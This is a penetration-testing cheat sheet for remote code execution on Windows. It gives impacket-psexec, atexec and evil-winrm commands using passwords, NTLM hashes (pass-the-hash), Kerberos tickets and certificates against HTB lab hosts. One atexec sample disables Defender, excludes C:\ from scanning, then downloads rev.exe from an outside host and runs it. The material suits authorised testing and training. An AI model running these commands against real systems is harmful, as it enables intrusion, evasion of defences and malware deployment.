---
title: "Winrm"
date: 2024-7-27
tags: ["Kerberos", "Pass-The-Hash", "RCE", "Evil-Winrm", "Windows", "Pass-The-Ticket", "Pass-The-Cert", "Winrm", "PsExec", "AtExec"]
---

### PsExec

{{< tab set1 tab1 >}}Password{{< /tab >}}
{{< tab set1 tab2 >}}NTLM{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Domain auth
impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

```console
# Local auth
impacket-psexec '<USER>:<PASSWORD>@<TARGET>'
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Domain auth
impacket-psexec '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH>
```

```console
# Local auth
impacket-psexec '<USER>@<TARGET>' -hashes :<HASH>
```

{{< /tabcontent >}}

### AtExec

{{< tab set2 tab1 >}}Password{{< /tab >}}
{{< tab set2 tab2 >}}NTLM{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
# Local auth
impacket-atexec '<WORKGROUP>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' 'powershell.exe -c "<CMD>"'
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
# Local auth
impacket-atexec '<WORKGROUP>/<USER>@<TARGET_DOMAIN>' -hashes :<HASH> 'powershell.exe -c "<CMD>"'
```

```console {class=sample-code}
$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \gNBJCrJi
[*] Running task \gNBJCrJi
[*] Deleting task \gNBJCrJi
[*] Attempting to read ADMIN$\Temp\gNBJCrJi.tmp
                                                                                                                                                            
$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -ExclusionPath C:\\"'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \cbUEDAaz
[*] Running task \cbUEDAaz
[*] Deleting task \cbUEDAaz
[*] Attempting to read ADMIN$\Temp\cbUEDAaz.tmp
                                                                                                                                                            
$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "iwr 10.8.7.13:8443/rev.exe -outfile C:\programdata\rev.exe"'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \RmSAvink
[*] Running task \RmSAvink
[*] Deleting task \RmSAvink
[*] Attempting to read ADMIN$\Temp\RmSAvink.tmp
                                                                                                                                                            
$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "C:\programdata\rev.exe"' 
 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \LCpKICMQ
[*] Running task \LCpKICMQ
[*] Deleting task \LCpKICMQ
[*] Attempting to read ADMIN$\Temp\LCpKICMQ.tmp
```

{{< /tabcontent >}}

### Evil-Winrm

{{< tab set3 tab1 >}}Password{{< /tab >}}
{{< tab set3 tab2 >}}NTLM{{< /tab >}}
{{< tab set3 tab3 >}}Kerberos{{< /tab >}}
{{< tab set3 tab4 >}}crt & key{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>'
```

```console {class=sample-code}
$ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p 'qwe123QWE!@#'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents>
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
evil-winrm -i <TARGET> -u '<USER>' -H <HASH> 
```

{{< /tabcontent >}}
{{< tabcontent set3 tab3 >}}

```console
# Step 1: Edit '/etc/krb5.conf' (All in uppercase)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = {
        kdc = HOPE.WINDCORP.HTB:88
        admin_server = HOPE.WINDCORP.HTB
        default_domain = WINDCORP.HTB
    }
    
[domain_realm]
    .domain.internal = WINDCORP.HTB
    domain.internal = WINDCORP.HTB
```

```console
# Step 2: Request a TGT
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console
# Step 3: export .ccache
export KRB5CCNAME=<CCACHE>
```

```console {class="sample-code"}
$ export KRB5CCNAME=winrm_user.ccache
```

```console
# Step 4: Connect
sudo ntpdate -s <DC_IP> && evil-winrm -i <TARGET> -r <DOMAIN>
```

```console {class="sample-code"}
$ evil-winrm -i dc.absolute.htb -r absolute.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
```

{{< /tabcontent >}}
{{< tabcontent set3 tab4 >}}

```console
evil-winrm -i <TARGET> -S -k auth.key -c auth.crt
```

{{< /tabcontent >}}

### Disable Winrm

```console
Disable-PSRemoting -Force
```

```console
Stop-Service WinRM -PassThru
```

```console
Set-Service WinRM -StartupType Disabled -PassThru
```